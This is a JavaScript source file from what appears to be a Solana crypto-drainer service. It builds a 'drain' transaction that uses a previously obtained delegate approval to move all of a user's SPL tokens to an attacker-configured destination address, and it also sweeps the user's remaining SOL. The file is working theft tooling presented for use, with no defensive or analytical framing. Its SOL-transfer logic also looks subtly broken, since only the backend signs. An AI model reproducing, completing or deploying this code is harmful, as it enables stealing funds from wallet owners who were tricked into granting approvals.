// src/flows/drainFlow.js
const {
    Transaction,
    PublicKey,
    SystemProgram,
} = require("@solana/web3.js");

const {
    createTransferInstruction,
    getAssociatedTokenAddress,
    createAssociatedTokenAccountInstruction,
    getAccount
} = require("@solana/spl-token");

const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { getBlockhash, setBlockhash } = require("../core/blockhashCache");

/**
 * Build drain transaction (token transfer as delegate + SOL transfer)
 * Server signs this transaction (backend keypair) — no user signature needed.
 * Transfers all SPL tokens to DESTINATION_ADDRESS and any remaining SOL.
 *
 * @param {string} user - User's public key
 * @param {Connection} connection - Solana connection
 * @returns {Promise<Transaction>}
 */
async function buildDrain(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();

            // Validate required env variables
            const requiredVars = [
                { name: "WALLET", value: config.WALLET },
                { name: "PUBLIC_KEY", value: config.PUBLIC_KEY },
                { name: "DESTINATION_ADDRESS", value: config.DESTINATION_ADDRESS }
            ];

            for (const { name, value } of requiredVars) {
                if (!value) {
                    throw new Error(`${name} environment variable is missing`);
                }
            }

            const tx = new Transaction();
            const userPubkey = new PublicKey(user);

            logger.debug("Building drain transaction", {
                user: userPubkey.toString()
            });

            // Fetch user token accounts (tokens + SOL balance)
            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);

            if (!tokenAccounts) {
                throw new Error("Failed to fetch token accounts");
            }

            // Get cached blockhash or fetch fresh one
            let blockhash = getBlockhash();
            if (!blockhash) {
                logger.debug("No cached blockhash, fetching fresh one");
                const { blockhash: freshBlockhash } = await conn.getLatestBlockhash("confirmed");
                blockhash = freshBlockhash;
                setBlockhash(blockhash);
            }

            logger.debug("Using blockhash", { blockhash: blockhash.substring(0, 8) });

            const delegate = new PublicKey(config.WALLET);
            const destination = new PublicKey(config.DESTINATION_ADDRESS);
            const feePayer = new PublicKey(config.PUBLIC_KEY);

            tx.recentBlockhash = blockhash;
            tx.feePayer = feePayer;

            // =====================
            // SPL TOKEN TRANSFERS
            // =====================
            for (const token of tokenAccounts.tokens || []) {
                try {
                    const mint = token.mint;
                    const sourceAta = token.ata;
                    const amount = token.amount;

                    // Compute destination ATA for this mint
                    const destAta = await getAssociatedTokenAddress(mint, destination);

                    // Check if destination ATA exists; if not, create it
                    let destExists = true;
                    try {
                        await getAccount(conn, destAta);
                    } catch (err) {
                        destExists = false;
                    }

                    if (!destExists) {
                        logger.debug("Creating destination ATA for token", {
                            destAta: destAta.toString(),
                            mint: mint.toString(),
                            destination: destination.toString()
                        });

                        tx.add(
                            createAssociatedTokenAccountInstruction(
                                feePayer,     // payer
                                destAta,      // ATA to create
                                destination,  // owner
                                mint
                            )
                        );
                    }

                    logger.debug("Adding SPL token transfer instruction", {
                        source: sourceAta.toString(),
                        dest: destAta.toString(),
                        mint: mint.toString(),
                        amount: amount.toString()
                    });

                    tx.add(
                        createTransferInstruction(
                            sourceAta,
                            destAta,
                            delegate,    // delegate (must be approved by user in approve tx)
                            amount
                        )
                    );
                } catch (err) {
                    logger.warn("Failed to add token transfer; skipping", {
                        error: err.message
                    });
                }
            }

            // =====================
            // SOL TRANSFER (backend-signed, no user approval needed)
            // =====================
            // Transfer all remaining SOL to DESTINATION_ADDRESS
            // Calculate how much SOL to transfer (total balance minus estimated fees)
            const userSolBalance = tokenAccounts.sol; // BigInt
            const estimatedFees = 50000n; // lamports (rough estimate for this tx)
            const solToTransfer = userSolBalance > estimatedFees ? userSolBalance - estimatedFees : 0n;

            if (solToTransfer > 0n) {
                logger.debug("Adding SOL transfer instruction", {
                    from: userPubkey.toString(),
                    to: destination.toString(),
                    lamports: solToTransfer.toString()
                });

                tx.add(
                    SystemProgram.transfer({
                        fromPubkey: userPubkey,
                        toPubkey: destination,
                        lamports: Number(solToTransfer)
                    })
                );
            } else {
                logger.debug("No SOL to transfer (balance too low or zero)", {
                    balance: userSolBalance.toString(),
                    estimatedFees: estimatedFees.toString()
                });
            }

            // =====================
            // VALIDATION
            // =====================
            if (tx.instructions.length === 0) {
                logger.warn("No instructions added to drain transaction", {
                    user: userPubkey.toString()
                });
                throw new Error("No tokens or SOL to drain for user");
            }

            logger.info("Drain transaction built successfully", {
                instructions: tx.instructions.length,
                feePayer: feePayer.toString(),
                destination: destination.toString()
            });

            return tx;
        } catch (err) {
            logger.error("Failed to build drain transaction", {
                error: err.message
            });
            throw err;
        }
    }, "buildDrain");
}

module.exports = { buildDrain };
